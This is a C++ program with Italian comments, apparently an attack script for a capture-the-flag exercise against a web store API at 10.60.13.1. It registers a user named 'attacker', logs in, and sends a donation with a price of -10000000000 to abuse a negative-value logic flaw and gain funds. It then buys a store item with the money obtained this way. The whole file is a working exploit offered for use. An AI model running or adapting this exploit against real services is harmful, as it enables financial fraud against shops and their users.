#include <iostream>
#include <string>
#include <curl/curl.h>

// Funzione di callback per gestire la risposta di curl
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t totalSize = size * nmemb;
    s->append(static_cast<char*>(contents), totalSize);
    return totalSize;
}

// Funzione per eseguire una richiesta POST con curl
std::string curl_post(const std::string& url, const std::string& data, const std::string& cookie = "", const std::string& auth_header = "") {
    CURL* curl;
    CURLcode res;
    std::string readBuffer;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());

        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        if (!auth_header.empty()) {
            headers = curl_slist_append(headers, ("Authorization: Bearer " + auth_header).c_str());
        }
        if (!cookie.empty()) {
            headers = curl_slist_append(headers, ("Cookie: " + cookie).c_str());
        }

        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
        }
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
    return readBuffer;
}

// Funzione per registrare un utente
bool register_user(const std::string& username, const std::string& email, const std::string& password) {
    std::string url = "http://10.60.13.1/api/register";
    std::string payload = "{\"username\":\"" + username + "\",\"email\":\"" + email + "\",\"password\":\"" + password + "\"}";

    std::string response = curl_post(url, payload);
    if (response.find("201") != std::string::npos) {
        std::cout << "Registrazione avvenuta con successo!" << std::endl;
        return true;
    } else if (response.find("409") != std::string::npos) {
        std::cout << "Utente già esistente. Procedo con il login." << std::endl;
        return false;  // Indica che l'utente esiste già
    } else {
        std::cerr << "Errore durante la registrazione: " << response << std::endl;
        return false;
    }
}

// Funzione per il login utente
std::string login_user(const std::string& username, const std::string& password) {
    std::string url = "http://10.60.13.1/api/login";
    std::string payload = "{\"username\":\"" + username + "\",\"password\":\"" + password + "\"}";

    std::string response = curl_post(url, payload);
    if (response.find("session") != std::string::npos) {
        std::cout << "Login avvenuto con successo!" << std::endl;
        return response;  // Restituisce il token di sessione
    } else {
        std::cerr << "Errore durante il login: " << response << std::endl;
        return "";
    }
}

// Funzione exploit (donazione con valore negativo)
bool exploit_donate(const std::string& session_token, const std::string& flag_id) {
    std::string url = "http://10.60.13.1/api/donate";
    std::string payload = "{\"price\":-10000000000,\"username\":\"" + flag_id + "\"}";

    std::string response = curl_post(url, payload, session_token);
    if (response.find("200") != std::string::npos) {
        std::cout << "Exploit eseguito con successo! Soldi ottenuti!" << std::endl;
        return true;
    } else {
        std::cerr << "Errore durante l'exploit: " << response << std::endl;
        return false;
    }
}

// Funzione per comprare un articolo
bool buy_item(const std::string& session_token, int item_id) {
    std::string url = "http://10.60.13.1/api/store/" + std::to_string(item_id) + "/buy";
    std::string response = curl_post(url, "", session_token);

    if (response.find("200") != std::string::npos) {
        std::cout << "Articolo " << item_id << " acquistato con successo!" << std::endl;
        return true;
    } else {
        std::cerr << "Errore durante l'acquisto dell'articolo: " << response << std::endl;
        return false;
    }
}

int main() {
    // Dettagli utente
    std::string username = "attacker";
    std::string email = "attacker@example.com";
    std::string password = "password123";

    // Registrazione
    bool registration_result = register_user(username, email, password);
    if (registration_result) {
        std::cout << "Utente registrato e pronto." << std::endl;
    } else {
        std::cout << "Utente esistente, procedo con il login." << std::endl;
    }

    // Login
    std::string session_token = login_user(username, password);
    if (!session_token.empty()) {
        // Exploit
        std::string flag_id = "flag123";  // Sostituisci con il flag corretto
        if (exploit_donate(session_token, flag_id)) {
            // Acquisto di un articolo
            int item_id = 1;
            buy_item(session_token, item_id);
        }
    }

    return 0;
}